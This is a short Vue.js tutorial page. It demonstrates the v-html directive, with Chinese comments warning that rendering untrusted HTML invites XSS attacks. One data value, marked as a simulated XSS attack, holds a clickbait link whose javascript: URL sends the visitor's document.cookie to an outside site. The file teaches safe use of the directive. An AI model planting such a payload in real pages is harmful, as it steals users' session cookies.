<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>v-html指令</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<!-- 
    
    v-html指令：
        1. 作用：向指定节点中渲染包含html结构的内容。
        2. 与插值语法的区别：
            （1）v-html会替换掉节点中所有的内容，{{ xxx }}则不会；
            （2）v-html可以识别html结构。
        3. 【注意】 v-html有安全性问题
            （1）再网站上动态渲染任意html都是非常危险的，容易导致XSS攻击。
            （2）一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上。
        
-->

<body>
    <div id="root">
        <div>Hello, {{ name }}</div>
        <div v-text="name">Hello, </div>
        <div v-text="str"></div>
        <div v-html="str2"></div>
        <div v-html="str3"></div>
    </div>
</body>

<script type="text/javascript">
    Vue.config.productionTip = false;

    new Vue({
        el: '#root',
        data: {
            name: 'Howsco',
            str: '<h2>你好</h2>',
            str2: '<h2>你好</h2>',
            str3: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>这里有好康的，快点击！</a>' // 模拟XSS攻击
        }
    })
</script>
</html>
